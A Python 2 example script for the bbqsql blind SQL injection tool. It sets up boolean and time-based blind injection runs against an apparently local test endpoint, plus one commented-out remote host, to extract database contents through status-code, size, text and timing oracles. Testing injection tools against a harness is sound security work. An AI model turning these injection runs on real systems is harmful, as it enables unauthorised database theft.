import bbqsql
from time import time
from urllib import quote

#REMOTE STATUS CODE BASED EXAMPLE
'''
url     = bbqsql.Query('http://btoe.ws:8090/error?${injection}')
query   = bbqsql.Query("row_index=${row_index:1}&character_index=${char_index:1}&character_value=${char_val:0}&comparator=${comparator:>}&sleep=${sleep:0}&foo=${user_query:unimportant}",encoder=quote)

bh      = bbqsql.BooleanBlindSQLi(url=url,query=query,method='GET',comparison_attr='status_code')

start = time()
results = bh.run(concurrency=100)
stop = time()

print "dumped db in %f seconds" % (stop-start)
'''

#STATUS CODE BASED EXAMPLE
url     = bbqsql.Query('http://127.0.0.1:8090/error?${injection}')
query   = bbqsql.Query("row_index=${row_index:1}&character_index=${char_index:1}&character_value=${char_val:0}&comparator=${comparator:>}&sleep=${sleep:0}&foo=${user_query:unimportant}",encoder=quote)

bh      = bbqsql.BooleanBlindSQLi(url=url,query=query,method='GET',comparison_attr='status_code')

start = time()
results = bh.run(query="select user()",concurrency=35)
stop = time()

print "dumped db in %f seconds" % (stop-start)

#SIZE BASED EXAMPLE
'''
url     = bbqsql.Query('http://127.0.0.1:8090/boolean?${injection}')
query   = bbqsql.Query("row_index=${row_index:1}&character_index=${char_index:1}&character_value=${char_val:0}&comparator=${comparator:>}&sleep=${sleep:0}&foo=${user_query:unimportant}",encoder=quote)

bh      = bbqsql.BooleanBlindSQLi(url=url,query=query,method='GET',comparison_attr='size')

start = time()
results = bh.run(query="select user()",concurrency=30)
stop = time()

print "dumped db in %f seconds" % (stop-start)
'''

#TEXT BASED EXAMPLE
'''
url     = bbqsql.Query('http://127.0.0.1:8090/boolean?${injection}')
query   = bbqsql.Query("row_index=${row_index:1}&character_index=${char_index:1}&character_value=${char_val:0}&comparator=${comparator:>}&sleep=${sleep:0}&foo=${user_query:unimportant}",encoder=quote)

bh      = bbqsql.BooleanBlindSQLi(url=url,query=query,method='GET',comparison_attr='text')

start = time()
results = bh.run(query="select user()",concurrency=35)
stop = time()

print "dumped db in %f seconds" % (stop-start)
'''

# TIME BASED EXAMPLE
'''
url = bbqsql.Query('http://127.0.0.1:8090/time?${query}')
query = bbqsql.Query("row_index=${row_index:1}&character_index=${char_index:1}&character_value=${char_val:0}&comparator=${comparator:>}&sleep=${sleep:.2}&foo=${user_query:unimportant}",encoder=quote)

bh = bbqsql.BooleanBlindSQLi(url=url,query=query,comparison_attr='time')
start = time()
results = bh.run(concurrency=50,sleep=.2)
stop = time()

print "dumped db in %f seconds" % (stop-start)
'''
